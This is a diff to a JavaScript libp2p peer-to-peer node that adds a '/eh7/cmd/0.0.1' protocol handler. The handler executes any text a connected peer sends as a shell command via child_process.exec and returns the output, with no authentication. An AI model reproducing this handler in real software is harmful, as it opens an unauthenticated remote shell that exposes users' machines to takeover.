@@ -17,7 +17,7 @@ const Pushable = require('pull-pushable')
 const p = Pushable()
 
 const bootstrapers = [
-  '/ip4/192.168.1.12/tcp/10333/ipfs/QmZiicp2DZuf9Xc9mNiMkc3hiDz4KipoiNzFZbhxLK9Do1',
+//  '/ip4/192.168.1.12/tcp/10333/ipfs/QmZiicp2DZuf9Xc9mNiMkc3hiDz4KipoiNzFZbhxLK9Do1',
   '/ip4/10.0.0.10/tcp/10333/ipfs/QmZiicp2DZuf9Xc9mNiMkc3hiDz4KipoiNzFZbhxLK9Do1'
 ]
 
@@ -68,6 +68,28 @@ PeerId.createFromJSON(nodeId,(err,nodeId) => {
     node = new Libp2pNode({
       peerInfo: nodeInfo
     })
+
+    node.handle('/eh7/cmd/0.0.1', (protocol, conn) => {
+      console.log("handled /eh7/cmd/0.0.1")
+      pull(
+        conn,
+        pull.map((data) => {
+          return data.toString('utf8').replace('\n', '')
+        }),
+        pull.drain((cmd) => {
+	  console.log("cmd sent to me: " + cmd)
+          var exec = require('child_process').exec;
+          exec(cmd, function callback(error, stdout, stderr){
+            console.log("exec stdout-> ", error, stdout, stderr)
+            pull(
+              pull.values([stdout]),
+              conn
+            )
+          })
+        })
+      )
+
+    })
  
     node.start((err) => {
       if(err) console.log(err)
@@ -85,7 +107,7 @@ PeerId.createFromJSON(nodeId,(err,nodeId) => {
 
     node.on('peer:discovery', (peer) => {
       // No need to dial, autoDial is on
-      console.log('Discovered:', peer.id.toB58String())
+//      console.log('Discovered:', peer.id.toB58String())
 //      node.pubsub.publish('info', Buffer.from('discovered ' +  peer.id.toB58String() + ' here!!!'), (err) => {if(err)console.log(err)})
     })
 
@@ -126,11 +148,13 @@ PeerId.createFromJSON(nodeId,(err,nodeId) => {
         }
       })
 
+/*
       var exec = require('child_process').exec;
       exec('ls', function callback(error, stdout, stderr){
         // result
         console.log("exec stdout-> ", error, stdout, stderr)
       })
+*/
 
     })
 
